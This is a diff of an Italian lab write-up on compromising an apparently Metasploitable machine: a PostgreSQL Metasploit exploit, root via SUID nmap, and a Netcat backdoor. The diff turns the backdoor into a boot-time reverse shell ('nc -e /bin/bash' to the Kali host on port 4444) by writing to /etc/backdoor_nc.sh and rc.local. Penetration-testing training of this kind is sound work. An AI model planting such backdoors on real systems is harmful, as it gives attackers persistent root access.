@@ -7,7 +7,7 @@ L'obiettivo è stato raggiunto attraverso un approccio sistematico e ben documen
 - Configurazione dell'exploit PostgreSQL per ottenere una sessione iniziale Meterpreter.
 - Verifica della presenza di binari vulnerabili con il bit SUID attivo.
 - Escalation manuale a root sfruttando `nmap` in modalità interattiva.
-- Installazione di una **backdoor persistente** con Netcat compatibile con sistemi a **32 bit**.
+- Installazione di una **backdoor persistente** con Netcat compatibile con sistemi a **32 bit**, forzando l'interfaccia corretta per comunicare con Kali Linux.
 
 ---
 
@@ -58,26 +58,32 @@ Abbiamo sfruttato manualmente `nmap` per ottenere una shell root:
    ```
 - **Risultato:** Utente elevato a **root**.
 
-![Meterpreter](./MeterpreterOK.png)
+![ROOT!](./MeterpreterOK.png)
 
 ### **5. Installazione della backdoor persistente con Netcat**
-Per ottenere una connessione persistente root su ogni avvio del sistema target:
+Per ottenere una connessione persistente root su ogni avvio del sistema target, configurando correttamente la connessione verso Kali Linux:
 1. Creazione dello script di backdoor:
    ```bash
    echo '#!/bin/bash' > /etc/backdoor_nc.sh
-   echo 'nc -lvp 4444 -e /bin/bash' >> /etc/backdoor_nc.sh
+   echo 'nc -e /bin/bash -s 192.168.50.3 192.168.50.2 4444' >> /etc/backdoor_nc.sh
    chmod +x /etc/backdoor_nc.sh
    ```
+   - **Spiegazione:**
+     - `-e /bin/bash`: Esegue la shell.
+     - `-s 192.168.50.3`: Forza l'interfaccia IP della macchina target (Metasploitable).
+     - `192.168.50.2 4444`: Invio della connessione verso Kali Linux.
+
 2. Aggiunta della backdoor all'avvio del sistema tramite `rc.local`:
    ```bash
    echo '/etc/backdoor_nc.sh &' >> /etc/rc.local
    chmod +x /etc/rc.local
    ```
+
 3. Verifica del contenuto di `rc.local`:
    ```bash
    cat /etc/rc.local
    ```
-- **Risultato:** La backdoor verrà eseguita automaticamente ad ogni avvio del sistema, aprendo una connessione Netcat sulla porta `4444`.
+- **Risultato:** La backdoor verrà eseguita automaticamente ad ogni avvio del sistema, aprendo una connessione Netcat verso Kali Linux sulla porta `4444` utilizzando l'interfaccia IP corretta.
 
 ---
 
@@ -85,7 +91,7 @@ Per ottenere una connessione persistente root su ogni avvio del sistema target:
 - **Accesso iniziale:** Sessione Meterpreter come utente `postgres`.
 - **Escalation di privilegi:** Eseguita con successo sfruttando `nmap` con bit SUID.
 - **Privilegi finali:** Shell root sul sistema target.
-- **Backdoor persistente:** Configurata tramite Netcat per una connessione automatica ad ogni avvio.
+- **Backdoor persistente:** Configurata tramite Netcat per una connessione automatica ad ogni avvio verso l'IP di Kali Linux utilizzando `eth1`.
 
 ---
 
@@ -93,12 +99,12 @@ Per ottenere una connessione persistente root su ogni avvio del sistema target:
 - **Metasploit Framework:** Per lanciare l'exploit PostgreSQL e ottenere l'accesso iniziale.
 - **Nmap (SUID):** Sfruttato manualmente per ottenere root.
 - **Linux Shell:** Per l'esecuzione di comandi manuali post-escalation.
-- **Netcat:** Utilizzato per creare una backdoor persistente con supporto a 32 bit.
+- **Netcat:** Utilizzato per creare una backdoor persistente configurata per l'interfaccia corretta.
 
 ---
 
 ## 📌 **Considerazioni finali**
 Questa esercitazione ha dimostrato l'importanza di combinare strumenti automatizzati (come Metasploit) con tecniche manuali per sfruttare vulnerabilità note. L'escalation di privilegi tramite `nmap` evidenzia come l'errata configurazione dei permessi possa essere sfruttata per ottenere il controllo completo di un sistema target.
 
-La backdoor persistente con Netcat consente di mantenere l'accesso root in modo stabile e automatico, semplificando la fase post-exploitation.
+La backdoor persistente con Netcat consente di mantenere l'accesso root in modo stabile e automatico, semplificando la fase post-exploitation e risolvendo problematiche legate alle interfacce multiple.
 
